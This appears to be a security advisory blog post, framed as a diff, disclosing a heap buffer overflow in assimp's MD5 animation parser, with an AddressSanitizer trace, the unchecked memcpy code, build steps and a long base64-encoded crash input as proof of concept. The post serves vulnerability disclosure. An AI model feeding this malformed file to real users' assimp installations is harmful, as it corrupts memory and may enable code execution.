@@ -1,0 +1,506 @@
+---
+title: Heap Overflow in assimp
+date: 2024-04-5
+draft: false 
+tags: [heap-overflow, assimp, memory] 
+toc: true 
+---
+
+
+
+# Heap Overflow #6019
+
+## **Bug: Heap-based Buffer Overflow in AI_MD5_PARSE_STRING_IN_QUOTATION**
+
+Source: https://github.com/assimp/assimp/issues/6019
+
+### Summary
+
+heap buffer overflow in `AI_MD5_PARSE_STRING_IN_QUOTATION`. An attacker could potentially exploit the vulnerability to cause a remote code execution, if they can trick the victim into running assimp on a malformed MD5 file.
+
+Heap Overflow was caused by function `memcpy` 
+
+```diff
+MEMCPY(3)                                                                                                                                              Linux Programmer's Manual                                                                                                                                             MEMCPY(3)
+
+NAME
+       memcpy - copy memory area
+
+SYNOPSIS
+       #include <string.h>
+
+       void *memcpy(void *dest, const void *src, size_t n);
+
+DESCRIPTION
+       The memcpy() function copies n bytes from memory area src to memory area dest.  The memory areas must not overlap.  Use memmove(3) if the memory areas do overlap.
+
+RETURN VALUE
+       The memcpy() function returns a pointer to dest.
+
+ATTRIBUTES
+       For an explanation of the terms used in this section, see attributes(7).
+
+```
+
+### ACID FLOW
+
+ASAN giving heap overflow error in fucntion AI_MD5_PARSE_STRING_IN_QUOTATION
+
+```bash
+==78753==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000018300 at pc 0x58950c234ba3 bp 0x7ffe08a2d9d0 sp 0x7ffe08a2d198
+WRITE of size 16415 at 0x629000018300 thread T0
+    #0 0x58950c234ba2 in __interceptor_memcpy (/home/capstone/research/assimp/assimp_fuzzer+0x17aba2) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #1 0x58950c4ab9d1 in AI_MD5_PARSE_STRING_IN_QUOTATION(char const**, char const*, aiString&) (/home/capstone/research/assimp/assimp_fuzzer+0x3f19d1) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #2 0x58950c4aa9e5 in Assimp::MD5::MD5AnimParser::MD5AnimParser(std::vector<Assimp::MD5::Section, std::allocator<Assimp::MD5::Section> >&) (/home/capstone/research/assimp/assimp_fuzzer+0x3f09e5) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #3 0x58950c4a355e in Assimp::MD5Importer::LoadMD5AnimFile() (/home/capstone/research/assimp/assimp_fuzzer+0x3e955e) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #4 0x58950c4a0578 in Assimp::MD5Importer::InternReadFile(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, aiScene*, Assimp::IOSystem*) (/home/capstone/research/assimp/assimp_fuzzer+0x3e6578) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #5 0x58950caca48e in Assimp::BaseImporter::ReadFile(Assimp::Importer*, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, Assimp::IOSystem*) (/home/capstone/research/assimp/assimp_fuzzer+0xa1048e) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #6 0x58950c2fd30d in Assimp::Importer::ReadFile(char const*, unsigned int) (/home/capstone/research/assimp/assimp_fuzzer+0x24330d) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #7 0x58950c2fc3a9 in Assimp::Importer::ReadFileFromMemory(void const*, unsigned long, unsigned int, char const*) (/home/capstone/research/assimp/assimp_fuzzer+0x2423a9) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #8 0x58950c2d85a2 in LLVMFuzzerTestOneInput (/home/capstone/research/assimp/assimp_fuzzer+0x21e5a2) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #9 0x58950c200fe3 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x146fe3) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #10 0x58950c1ead5f in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x130d5f) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #11 0x58950c1f0ab6 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/capstone/research/assimp/assimp_fuzzer+0x136ab6) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #12 0x58950c21a8d2 in main (/home/capstone/research/assimp/assimp_fuzzer+0x1608d2) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #13 0x7f8750629d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
+    #14 0x7f8750629e3f in __libc_start_main csu/../csu/libc-start.c:392:3
+    #15 0x58950c1e5624 in _start (/home/capstone/research/assimp/assimp_fuzzer+0x12b624) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+
+0x629000018300 is located 0 bytes to the right of 16640-byte region [0x629000014200,0x629000018300)
+allocated by thread T0 here:
+    #0 0x58950c29d65e in malloc (/home/capstone/research/assimp/assimp_fuzzer+0x1e365e) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #1 0x7f8750ab751b in operator new(unsigned long) (/usr/lib/x86_64-linux-gnu/libstdc++.so.6+0xb751b) (BuildId: 2db998bd67acbfb235c464c0275d4070061695fb)
+    #2 0x58950c4b1630 in std::allocator_traits<std::allocator<Assimp::MD5::AnimBoneDesc> >::allocate(std::allocator<Assimp::MD5::AnimBoneDesc>&, unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x3f7630) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #3 0x58950c4b07a7 in std::_Vector_base<Assimp::MD5::AnimBoneDesc, std::allocator<Assimp::MD5::AnimBoneDesc> >::_M_allocate(unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x3f67a7) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #4 0x58950c4ae7be in void std::vector<Assimp::MD5::AnimBoneDesc, std::allocator<Assimp::MD5::AnimBoneDesc> >::_M_realloc_insert<>(__gnu_cxx::__normal_iterator<Assimp::MD5::AnimBoneDesc*, std::vector<Assimp::MD5::AnimBoneDesc, std::allocator<Assimp::MD5::AnimBoneDesc> > >) (/home/capstone/research/assimp/assimp_fuzzer+0x3f47be) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #5 0x58950c4ac9b0 in Assimp::MD5::AnimBoneDesc& std::vector<Assimp::MD5::AnimBoneDesc, std::allocator<Assimp::MD5::AnimBoneDesc> >::emplace_back<>() (/home/capstone/research/assimp/assimp_fuzzer+0x3f29b0) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #6 0x58950c4aa9a8 in Assimp::MD5::MD5AnimParser::MD5AnimParser(std::vector<Assimp::MD5::Section, std::allocator<Assimp::MD5::Section> >&) (/home/capstone/research/assimp/assimp_fuzzer+0x3f09a8) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #7 0x58950c4a355e in Assimp::MD5Importer::LoadMD5AnimFile() (/home/capstone/research/assimp/assimp_fuzzer+0x3e955e) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #8 0x58950c4a0578 in Assimp::MD5Importer::InternReadFile(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, aiScene*, Assimp::IOSystem*) (/home/capstone/research/assimp/assimp_fuzzer+0x3e6578) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #9 0x58950caca48e in Assimp::BaseImporter::ReadFile(Assimp::Importer*, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, Assimp::IOSystem*) (/home/capstone/research/assimp/assimp_fuzzer+0xa1048e) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #10 0x58950c2fd30d in Assimp::Importer::ReadFile(char const*, unsigned int) (/home/capstone/research/assimp/assimp_fuzzer+0x24330d) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #11 0x58950c2fc3a9 in Assimp::Importer::ReadFileFromMemory(void const*, unsigned long, unsigned int, char const*) (/home/capstone/research/assimp/assimp_fuzzer+0x2423a9) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #12 0x58950c2d85a2 in LLVMFuzzerTestOneInput (/home/capstone/research/assimp/assimp_fuzzer+0x21e5a2) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #13 0x58950c200fe3 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x146fe3) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #14 0x58950c1ead5f in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/capstone/research/assimp/assimp_fuzzer+0x130d5f) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #15 0x58950c1f0ab6 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/capstone/research/assimp/assimp_fuzzer+0x136ab6) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #16 0x58950c21a8d2 in main (/home/capstone/research/assimp/assimp_fuzzer+0x1608d2) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49)
+    #17 0x7f8750629d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/capstone/research/assimp/assimp_fuzzer+0x17aba2) (BuildId: 2ce19df5dbc8f80939849c032cb13fa4a81b8d49) in __interceptor_memcpy
+Shadow bytes around the buggy address:
+  0x0c527fffb010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c527fffb020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c527fffb030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c527fffb040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c527fffb050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0c527fffb060:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c527fffb070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c527fffb080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c527fffb090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c527fffb0a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c527fffb0b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+
+```
+
+### Affected
+
+assimp>=5.4.3
+
+### Details
+
+aiString is struct that has 1024 size of array `data`.
+
+```bash
+struct aiString {
+
+...
+
+    /** Binary length of the string excluding the terminal 0. This is NOT the
+     *  logical length of strings containing UTF-8 multi-byte sequences! It's
+     *  the number of bytes from the beginning of the string to its end.*/
+    ai_uint32 length;
+
+    /** String buffer. Size limit is AI_MAXLEN */
+    char data[AI_MAXLEN];
+}; // !struct aiString
+```
+
+In `code/AssetLib/MD5/MD5Parser.cpp:302`, it does not validate the boundary of `sz`. Therefore, attacker can write arbitrary data and size that they want to.
+
+```bash
+// parse a string, enclosed in quotation marks
+inline void AI_MD5_PARSE_STRING_IN_QUOTATION(const char **sz, const char *bufferEnd, aiString &out) {
+    out.length = 0u;
+    while (('\"' != **sz && '\0' != **sz) && *sz != bufferEnd) {
+        ++*sz;
+    }
+    if ('\0' != **sz) {
+        const char *szStart = ++(*sz);
+        
+        while (('\"' != **sz && '\0' != **sz) && *sz != bufferEnd) {
+            ++*sz;
+        }
+        if ('\0' != **sz) {
+            const char *szEnd = *sz;
+            ++*sz;
+            out.length = (ai_uint32)(szEnd - szStart);
+            ::memcpy(out.data, szStart, out.length);
+        }
+    }
+    out.data[out.length] = '\0';
+}
+```
+
+### PoC
+
+1. build assimp with sanitizer
+
+```bash
+git clone https://github.com/assimp/assimp.git && cd assimp
+
+cmake CMakeLists.txt -G "Ninja" -DBUILD_SHARED_LIBS=OFF -DASSIMP_BUILD_ZLIB=ON \
+                    -DASSIMP_BUILD_TESTS=OFF -DASSIMP_BUILD_ASSIMP_TOOLS=OFF \
+                    -DASSIMP_BUILD_SAMPLES=OFF
+cmake --build .
+
+clang -fsanitize=address,fuzzer -std=c++11 -Iinclude fuzz/assimp_fuzzer.cc -o assimp_fuzzer ./lib/libassimp.a ./contrib/zlib/libzlibstatic.a
+```
+
+1. run fuzzer to trigger bug
+
+```bash
+echo "TUQ1VmVyc2lvbiAxMHNpb24gMTAAEE0MDEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhIT1JEIiAgOCAgICAgNTU1NTU1NTU1NSA3ICAgICA1NTU1
+NTU1NDU1CQCATElHSFRPQi9FQ1R0dDEwABBNDAxEAEVSgEQ1VlNIDQ0yKg0gMiA3SEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISHkg
+CQkJCXttf0Q1VgoKVgrJycnJycnJycnJycnJycnJycnJycnJycnJTWPpAGX6AABoDER/NjVWCgEK
+ZAAAZXlWLFdJQUxfCgpWClYQTQxNRVNIJkR/RYIAAGV5VixXSUEAAFYQTQwMZABEIkNIT1JEIiAF
+ICAgICAgNTU1NTU1NTU1NSA3ICAgICA1NTU1NTU1NTU1IDcgICAgIAkJAEQARVZTSA0NMioNIDIg
+NzMNDQ0gMg04IAFJMQw1VnQBZG1poUQBAHNpAQAgCXJWLFf6AABoaWVtZXRyeS1iamVjdH9ENVYK
+ClYKVixXAAIAaGllcmFyY2h5DEQKAWR/RCz6AABoaWVyYXJjaHkgCQkJCXttf0Q1CsnJycnJycnJ
+ycnJycnJycnJycnJycnJyclNY2QAAGV5VixXSUFMXwoKVgpWEE0MTUVTSCZEf0WCAABlSUEAAFYQ
+TQwMZABEIkNISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISFdH
+SFRISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEFuaW1hdGlvblNldEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhI
+SEhISEhISEhISEhISEhISEhISEhISEhISOrq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urqx+rq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6uoG6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq
+6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq6urq8erq6urq6urq
